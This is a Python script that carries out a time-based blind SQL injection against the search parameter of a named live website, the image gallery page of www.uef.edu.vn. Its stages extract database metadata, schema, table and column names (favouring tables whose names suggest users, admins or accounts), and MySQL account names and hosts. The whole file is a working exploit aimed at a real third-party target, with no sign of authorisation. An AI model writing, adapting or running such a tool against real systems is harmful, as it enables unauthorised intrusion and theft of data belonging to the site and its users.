#!/usr/bin/env python3
"""Blind SQLi enumerator for www.uef.edu.vn/thu-vien-hinh-anh (txtSearch).
Usage: python3 /tmp/sqli_enum_uef.py <stage>
Stages: calib | info | schemas | tables | columns | users
"""
import sys, time, json, threading, urllib.parse, urllib.request, re
from concurrent.futures import ThreadPoolExecutor

BASE = "https://www.uef.edu.vn/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
SLEEP = "0.5"
THRESH = 0.50          # giay, delta tren baseline => TRUE
WORKERS = 4
LOG = "/tmp/sqli_enum_uef.log"
JSONF = "/tmp/sqli_enum_uef.json"

lock = threading.Lock()
stats = {"req": 0, "base": 0.30}
cache = {}


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def http_dt(q, timeout=40):
    url = BASE + urllib.parse.quote(q, safe="")
    for attempt in range(2):
        t0 = time.time()
        try:
            with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout) as r:
                r.read(1024)
            dt = time.time() - t0
            with lock:
                stats["req"] += 1
            return dt
        except Exception as e:
            if attempt == 1:
                log("HTTP_ERR %r" % (e,))
                return None
    return None


def baseline_refresh():
    b = http_dt('the0"XOR(if(now()=sysdate(),0,0))XOR"Z')
    if b is not None:
        with lock:
            stats["base"] = 0.7 * stats["base"] + 0.3 * b
    return stats["base"]


def ask(expr):
    with lock:
        if expr in cache:
            return cache[expr]
        need_base = stats["req"] % 50 == 0
    if need_base:
        baseline_refresh()
    p = 'the0"XOR(if(now()=sysdate(),IF(%s,sleep(%s),0),0))XOR"Z' % (expr, SLEEP)
    dt = http_dt(p)
    b = stats["base"]
    res = False if dt is None else (dt - b) > THRESH
    with lock:
        cache[expr] = res
    return res


def get_len(expr, maxlen=100):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, maxlen=100):
    n = get_len(expr, maxlen)
    if n <= 0:
        log("%s: length=0 (NULL/empty/no access) | %s" % (label, expr))
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(get_char, expr, pos + 1): pos for pos in range(n)}
        for f, pos in futs.items():
            chars[pos] = f.result()
    s = "".join(chars)
    # verify full string in 1 request
    ok = ask("BINARY (%s)='%s'" % (expr, s.replace("\\", "\\\\").replace("'", "\\'")))
    log("%s = %r  (verify=%s, len=%d)" % (label, s, ok, n))
    return s


def num(expr, maxval=512):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def save(key, val):
    try:
        with open(JSONF) as f:
            d = json.load(f)
    except Exception:
        d = {}
    d[key] = val
    with open(JSONF, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def calibrate():
    global THRESH
    falses, trues = [], []
    for name, cond in (("TRUE", "1=1"), ("FALSE", "1=2")) * 3:
        p = 'the0"XOR(if(now()=sysdate(),IF(%s,sleep(%s),0),0))XOR"Z' % (cond, SLEEP)
        dt = http_dt(p)
        d = dt - stats["base"]
        log("CALIB %s -> %.3fs (base %.2f, delta %.2f)" % (name, dt, stats["base"], d))
        (trues if cond == "1=1" else falses).append(d)
        time.sleep(0.1)
    # baseline under light concurrent load too
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    futs = [ex.submit(http_dt, 'the0"XOR(if(now()=sysdate(),IF(1=2,sleep(%s),0),0))XOR"Z' % SLEEP) for _ in range(4)]
    conc = [f.result() for f in futs]
    ex.shutdown()
    log("CALIB concurrent FALSE raws: %s" % ["%.2f" % x for x in conc])
    if trues and falses:
        THRESH = (max(falses) + min(trues)) / 2
    log("CALIB falses=%s trues=%s -> THRESH=%.2f" % (["%.2f" % x for x in falses], ["%.2f" % x for x in trues], THRESH))
    save("threshold", THRESH)


def stage_info():
    out = {}
    out["database()"] = extract("SELECT database()", "database()", 64)
    out["user()"] = extract("SELECT user()", "user()", 64)
    out["current_user()"] = extract("SELECT current_user()", "current_user()", 64)
    out["@@version"] = extract("SELECT @@version", "@@version", 64)
    out["@@version_comment"] = extract("SELECT @@version_comment", "@@version_comment", 96)
    out["@@hostname"] = extract("SELECT @@hostname", "@@hostname", 64)
    out["@@datadir"] = extract("SELECT @@datadir", "@@datadir", 96)
    save("info", out)


def stage_schemas():
    n = num("SELECT COUNT(*) FROM information_schema.schemata", 64)
    names = []
    for i in range(min(n, 20)):
        names.append(extract("SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT %d,1" % i, "schema[%d]" % i, 64))
    save("schemas", names)


def stage_tables():
    n = num("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()", 512)
    names = []
    for i in range(min(n, 40)):
        names.append(extract("SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT %d,1" % i, "table[%d]" % i, 64))
    save("tables", names)
    if n > 40:
        save("tables_truncated", n)
        log("WARN tables count=%d, extracted first 40" % n)


def stage_columns():
    try:
        with open(JSONF) as f:
            d = json.load(f)
    except Exception:
        d = {}
    tables = [t for t in d.get("tables", []) if t]
    kw = re.compile(r"user|admin|account|member|tk|tai|quantri|hinh|image|gallery|news|article|bai|post|log|config", re.I)
    pick = [t for t in tables if kw.search(t)]
    pick = (pick + [t for t in tables if t not in pick])[:3]
    log("COLUMN TARGETS: %s" % pick)
    out = {}
    for t in pick:
        key = "table_name='%s'" % t.replace("'", "''")
        c = num("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND %s" % key, 128)
        cols = []
        for i in range(min(c, 30)):
            cols.append(extract("SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND %s ORDER BY ordinal_position LIMIT %d,1" % (key, i), "col[%s][%d]" % (t, i), 64))
        out[t] = cols
        log("COLUMNS %s (%d): %s" % (t, c, cols))
    save("columns", out)


def stage_users():
    out = {}
    n = num("SELECT COUNT(*) FROM mysql.user", 64)
    users = []
    for i in range(min(n, 8)):
        users.append(extract("SELECT user FROM mysql.user ORDER BY user LIMIT %d,1" % i, "mysql.user[%d]" % i, 48))
    out["mysql.user.users"] = users
    hosts = []
    for i in range(min(n, 8)):
        hosts.append(extract("SELECT host FROM mysql.user ORDER BY user LIMIT %d,1" % i, "mysql.user.host[%d]" % i, 48))
    out["mysql.user.hosts"] = hosts
    save("users", out)


if __name__ == "__main__":
    stage = sys.argv[1] if len(sys.argv) > 1 else "calib"
    t0 = time.time()
    log("=== STAGE %s START (workers=%d sleep=%s) ===" % (stage, WORKERS, SLEEP))
    {"calib": calibrate, "info": stage_info, "schemas": stage_schemas,
     "tables": stage_tables, "columns": stage_columns, "users": stage_users}[stage]()
    log("=== STAGE %s DONE in %.0fs, requests=%d ===" % (stage, time.time() - t0, stats["req"]))
